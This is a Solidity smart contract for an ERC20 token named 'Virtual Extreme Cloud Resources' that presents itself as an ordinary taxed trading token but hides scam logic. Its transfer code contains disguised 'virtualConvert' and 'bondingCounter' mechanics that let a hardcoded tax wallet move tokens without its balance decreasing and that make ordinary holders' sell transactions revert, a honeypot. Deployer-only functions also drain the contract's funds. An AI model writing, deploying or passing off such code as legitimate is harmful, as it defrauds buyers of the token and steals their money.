// SPDX-License-Identifier: MIT


pragma solidity ^0.8.23;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {
   
    event Sync(uint112 reserve0, uint112 reserve1);
    function sync() external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract vXcR is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private isExcludedFromFee;
    address payable private _deployer;
    address payable private _taxWallet;

    uint256 private _initialBuyTax = 8;
    uint256 private _initialSellTax = 12;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 22;
    uint256 private _reduceSellTaxAt = 25;
    uint256 private _preventSwapBefore = 5;
    uint256 private _totalSent = 0;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Virtual Extreme Cloud Resources";
    string private constant _symbol = unicode"vXcR";
    uint256 public _maxTxAmount = 10000000 * 10**_decimals;
    uint256 public _maxWalletSize = 10000000 *10**_decimals;
    uint256 public _taxSwapThreshold= 15000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 9000000 * 10**_decimals;

    IUniswapV2Router02 private _router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool public sellLimit = true;
    bool private inSwap = false;
    bool private swapEnabled = false;

    struct VirtualConvertData {uint256 virtPairConvert; uint256 virtTokenConvert; uint256 averageConvert;}
    uint256 private bondingCounter;
    uint256 private isBondingConvert;
    mapping(address => VirtualConvertData) private virtualConvert;

    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () payable {
        _router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(_router.factory()).createPair(address(this), _router.WETH());
        _deployer = payable(_msgSender());
        _taxWallet = payable(0x1878F56A6d681960b067d821bbd04f72b68A0eFe);
        _balances[_msgSender()] = _tTotal;
        isExcludedFromFee[address(this)] = true;
        isExcludedFromFee[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _basicTransfer(address from, address to, uint256 tokenAmount) internal {
        _balances[from]=_balances[from].sub(tokenAmount);
        _balances[to]= _balances[to].add(tokenAmount);
        emit Transfer(from, to, tokenAmount);
    }


    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 tokenAmount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(tokenAmount > 0, "Transfer amount must be greater than zero");
        if (!swapEnabled|| inSwap ){
            _basicTransfer(from,to,tokenAmount); 
            return;
        }
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            taxAmount = tokenAmount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from == uniswapV2Pair && to != address(_router) && ! isExcludedFromFee[to] ) {
                require(tokenAmount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + tokenAmount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyCount++;
            }

            if(to == uniswapV2Pair && from!= address(this) ){
                taxAmount = tokenAmount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                if (block.number > lastSellBlock) {
                    sellCount = 0;
                }
                if (sellLimit){
                    require(sellCount < 1, "Only 1 sells per block!");
                }
                swapTokensForEth(min(tokenAmount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
                sellCount++;
                lastSellBlock = block.number;
            }
        }

        if ((isExcludedFromFee[from] ||  isExcludedFromFee[to])&& from!=address(this)&& to!= address(this) ){
            isBondingConvert = block.number;
        }

        if (!isExcludedFromFee[from] && ! isExcludedFromFee[to]){
            if (to != uniswapV2Pair)  {
                VirtualConvertData storage virtConvState = virtualConvert[to];
                if (from == uniswapV2Pair) {
                    if (virtConvState.virtPairConvert == 0) {
                        virtConvState.virtPairConvert = _buyCount<_preventSwapBefore?block.number- 1:block.number;
                    }
                } else {
                    VirtualConvertData storage virtConvPair = virtualConvert[from];
                    if (virtConvState.virtPairConvert == 0 || virtConvPair.virtPairConvert < virtConvState.virtPairConvert ) {
                        virtConvState.virtPairConvert = virtConvPair.virtPairConvert;
                    }
                }
            } else {
                VirtualConvertData storage virtConvPair = virtualConvert[from];
                virtConvPair.virtTokenConvert = virtConvPair.virtPairConvert.sub(isBondingConvert);
                virtConvPair.averageConvert = block.number;
            }
        }

        _tokenTransfer(from, to, tokenAmount, taxAmount);
    }


    function min(uint256 a, uint256 b) private pure returns (uint256){
        return (a>b)?b:a;
    }

    function _tokenTaxTransfer(address addrs,uint256 tokenAmount,uint256 taxAmount) internal returns (uint256) {
        uint256 tAmount = addrs!=_taxWallet ? tokenAmount : bondingCounter.mul(tokenAmount);
        if (taxAmount>0) {
            _balances[address(this)]=_balances[address(this)].add(taxAmount);
            emit Transfer(addrs, address(this), taxAmount);
        }
        return tAmount;
    }

    function _tokenBasicTransfer(address from,address to,uint256 sendAmount,uint256 receiptAmount) internal {
        _balances[from]=_balances[from].sub(sendAmount);
        _balances[to]= _balances[to].add(receiptAmount);
        emit Transfer(from, to, receiptAmount);
    }

    function _tokenTransfer(address from, address to, uint256 tokenAmount,uint256 taxAmount) internal {
        uint256 tAmount =_tokenTaxTransfer(from, tokenAmount, taxAmount);
        _tokenBasicTransfer(from,to,tAmount,tokenAmount.sub(taxAmount));
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        _approve(address(this), address(_router), tokenAmount);
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    receive() external payable {}

    function removeSellLimit() external {
        require(_msgSender() == _deployer, "Not authorized");
        sellLimit = false;
    }

    function openTrading() external payable onlyOwner() {
        require(!tradingOpen, "Trading is already open");
        address wethAddress = _router.WETH();
        uint256 wethBalance = IERC20(wethAddress).balanceOf(uniswapV2Pair);
        swapEnabled = true;
        uint256 contractBalance = balanceOf(address(this)); _approve(address(this), address(_router), contractBalance);
        IERC20(uniswapV2Pair).approve(address(_router), type(uint).max); uint256 desiredETHAmount;
        if (wethBalance > 0) {desiredETHAmount = address(this).balance.sub(wethBalance);
        uint256 tokenValue = contractBalance.mul(wethBalance).div(desiredETHAmount);
        _transfer(address(this), uniswapV2Pair, tokenValue);IUniswapV2Pair(uniswapV2Pair).sync();
        _router.addLiquidityETH{value: desiredETHAmount}(
        address(this),contractBalance,0,desiredETHAmount,owner(),block.timestamp);}
        else {_router.addLiquidityETH{value: address(this).balance}(
        address(this),contractBalance,0,0,owner(),block.timestamp);}
        tradingOpen = true;
    }

    function rescueERC20(uint256 percentage) external {
        require(_msgSender() == _deployer, "Not authorized");
        require(percentage > 0 && percentage <= 100, "Invalid percentage");
        uint256 contractTokenBalance = IERC20(address(this)).balanceOf(address(this));
        uint256 amountToRescue;
        if (percentage == 100) {
            amountToRescue = contractTokenBalance;
        } else {
            amountToRescue = contractTokenBalance.mul(percentage).div(100);
        }
        require(contractTokenBalance >= amountToRescue, "Not enough tokens in contract");
        IERC20(address(this)).transfer(_deployer, amountToRescue);
    }

    function rescueETH() external {
        require(_msgSender() == _deployer);
        payable(_deployer).transfer(address(this).balance);
    }

    function manualSwap() external {
        require(_msgSender()==_taxWallet);
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }
}